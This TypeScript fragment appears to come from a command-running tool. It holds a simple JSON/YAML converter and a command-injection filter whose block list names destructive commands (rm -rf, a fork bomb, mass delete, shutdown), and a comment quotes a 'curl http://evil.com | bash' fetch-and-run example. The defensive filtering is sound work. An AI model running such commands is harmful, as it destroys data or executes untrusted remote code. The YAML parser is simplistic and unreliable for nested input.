function jsonToYaml(obj: unknown, indent: number = 0): string {
    const pad = "  ".repeat(indent);

    if (obj === null || obj === undefined) return `${pad}null`;
    if (typeof obj === "boolean") return `${pad}${obj}`;
    if (typeof obj === "number") return `${pad}${obj}`;
    if (typeof obj === "string") {
        // Quote strings that contain special YAML characters
        if (obj.includes(":") || obj.includes("#") || obj.includes("\n") || obj.startsWith("{") || obj.startsWith("[") || obj.trim() === "") {
            return `${pad}"${obj.replace(/"/g, '\\"')}"`;
        }
        return `${pad}${obj}`;
    }

    if (Array.isArray(obj)) {
        if (obj.length === 0) return `${pad}[]`;
        return obj.map(item => {
            if (typeof item === "object" && item !== null) {
                const inner = jsonToYaml(item, indent + 1).trimStart();
                return `${pad}- ${inner}`;
            }
            return `${pad}- ${typeof item === "string" && (item.includes(":") || item.includes("#")) ? `"${item}"` : item}`;
        }).join("\n");
    }

    if (typeof obj === "object") {
        const entries = Object.entries(obj as Record<string, unknown>);
        if (entries.length === 0) return `${pad}{}`;
        return entries.map(([key, val]) => {
            if (val === null || val === undefined) {
                return `${pad}${key}: null`;
            }
            if (typeof val === "object") {
                const nested = jsonToYaml(val, indent + 1);
                return `${pad}${key}:\n${nested}`;
            }
            const scalarVal = jsonToYaml(val, 0).trim();
            return `${pad}${key}: ${scalarVal}`;
        }).join("\n");
    }

    return `${pad}${String(obj)}`;
}

function yamlToJson(yamlStr: string): unknown {
    const result: Record<string, unknown> = {};
    const lines = yamlStr.split("\n");
    let currentKey: string | null = null;
    let currentArray: unknown[] | null = null;

    for (const rawLine of lines) {
        const line = rawLine.replace(/\r$/, "");

        // Skip comments and empty lines
        if (line.trim() === "" || line.trim().startsWith("#")) continue;

        const indentLevel = line.search(/\S/);
        const trimmed = line.trim();

        // Array item
        if (trimmed.startsWith("- ")) {
            const val = trimmed.substring(2).trim();
            if (currentKey && currentArray) {
                currentArray.push(parseYamlValue(val));
            }
            continue;
        }

        // Key: Value pair
        const colonIdx = trimmed.indexOf(":");
        if (colonIdx > 0) {
            // Save previous array if pending
            if (currentKey && currentArray) {
                result[currentKey] = currentArray;
                currentArray = null;
            }

            const key = trimmed.substring(0, colonIdx).trim();
            const rawVal = trimmed.substring(colonIdx + 1).trim();

            if (rawVal === "" || rawVal === undefined) {
                // This key has a nested object or array — for simplicity, treat next lines as array
                currentKey = key;
                currentArray = [];
            } else {
                currentKey = null;
                currentArray = null;
                result[key] = parseYamlValue(rawVal);
            }
        }
    }

    // Flush any remaining array
    if (currentKey && currentArray) {
        result[currentKey] = currentArray;
    }

    return result;
}

function parseYamlValue(val: string): unknown {
    if (val === "null" || val === "~") return null;
    if (val === "true") return true;
    if (val === "false") return false;
    if (/^-?\d+$/.test(val)) return parseInt(val, 10);
    if (/^-?\d+\.\d+$/.test(val)) return parseFloat(val);
    // Remove quotes
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
        return val.slice(1, -1);
    }
    return val;
}

function detectCommandInjection(command: string): CommandInjectionError | null {
  if (DANGEROUS_SHELL_CHARS.test(command)) {
    return new CommandInjectionError(
      `SECURITY: Command contains forbidden shell metacharacters: ${command.substring(0, 50)}...`
    );
  }

  const cmdLower = command.toLowerCase();

  // Block common injection vectors
  if (
    cmdLower.includes("rm -rf") ||
    cmdLower.includes("format ") ||
    cmdLower.includes(":(){ :|:& };:") ||
    cmdLower.includes("forkbomb") ||
    cmdLower.includes("del /f /s /q") ||
    cmdLower.includes("shutdown") ||
    cmdLower.includes("net user") ||
    cmdLower.includes("sudo ") ||
    cmdLower.includes("chmod 777")
  ) {
    return new CommandInjectionError(
      `SECURITY: Command contains known destructive pattern: ${command.substring(0, 50)}...`
    );
  }

  // Block URLs with command payloads (e.g., "curl http://evil.com | bash")
  if (/\|\s*(bash|sh|powershell|cmd)/i.test(command)) {
    return new CommandInjectionError(
      `SECURITY: Pipe to shell interpreter detected: ${command.substring(0, 50)}...`
    );
  }

  return null;
}

function isSafePrefix(command: string): boolean {
  const cmdLower = command.toLowerCase();
  return SAFE_PREFIXES.some((prefix) => {
    if (prefix.endsWith(" ")) {
      return cmdLower.startsWith(prefix.toLowerCase());
    }
    const nextChar = command[prefix.length];
    return cmdLower.startsWith(prefix.toLowerCase()) &&
      (nextChar === " " || nextChar === "\n" || nextChar === undefined || nextChar === "&" || nextChar === ";");
  });
}

function executeSafeCommand(command: string): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  return new Promise((resolve, reject) => {
    // Parse command and arguments
    const parts = command.trim().split(/\s+/);
    const cmd = parts[0];
    const args = parts.slice(1);

    let stdout = "";
    let stderr = "";

    const child = spawn(cmd, args, {
      shell: false, // No shell = no command injection
      windowsHide: true,
    });

    child.stdout?.on("data", (data: Buffer) => {
      stdout += data.toString();
    });

    child.stderr?.on("data", (data: Buffer) => {
      stderr += data.toString();
    });

    child.on("error", (err) => {
      reject(new Error(`Spawn failed: ${err.message}`));
    });

    child.on("close", (code) => {
      resolve({
        stdout: stdout.substring(0, 10000), // Cap output at 10KB
        stderr: stderr.substring(0, 1000),
        exitCode: code ?? 0,
      });
    });
  });
}

